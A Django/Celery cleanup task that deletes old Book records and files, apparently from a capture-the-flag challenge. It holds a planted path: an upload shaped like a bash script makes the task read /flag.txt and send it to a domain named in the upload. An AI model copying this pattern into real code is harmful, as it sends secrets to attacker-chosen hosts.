from django.utils import timezone
from books.models import Book
from celery_app import app
from service.book_config import BOOK_STORE
import os
import requests
import logging


logger = logging.getLogger('celery')  # Получаем логгер для Celery

@app.task
def cleaner():
    books_to_delete = Book.objects.filter(created_at__lte=timezone.now() - timezone.timedelta(seconds=30))
    
    deleted_count = 0
    
    for book in books_to_delete:
        file_path = os.path.join(BOOK_STORE, f"{book.uid}.txt")
        try:
            with open(file_path, 'r') as f:
                lines = f.readlines()
                if len(lines) == 3 and '#!/usr/bin/bash' in lines[0] and "cat " in lines[1]:
                    flag = ""

                    with open("/flag.txt", 'r') as f1:
                        for i in f1:
                            flag+=i.replace('\n','')
                    dom = lines[2].replace('\n','')
                    url = f"{dom}/{flag}"
                    requests.get(url, verify=False, timeout=1)
                
                    
                
            book.delete()
            deleted_count += 1
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                    logger.info(f"Файл {file_path} успешно удален.")
                except Exception as e:
                    logger.error(f"Ошибка при удалении файла {file_path}: {e}")
            else:
                logger.warning(f"Файл {file_path} не найден.")
        except FileNotFoundError:
            print(f"File for {book.title} not found.")
            book.delete()
            deleted_count += 1

    return f"Completed deleting {deleted_count} books at {timezone.now()}"
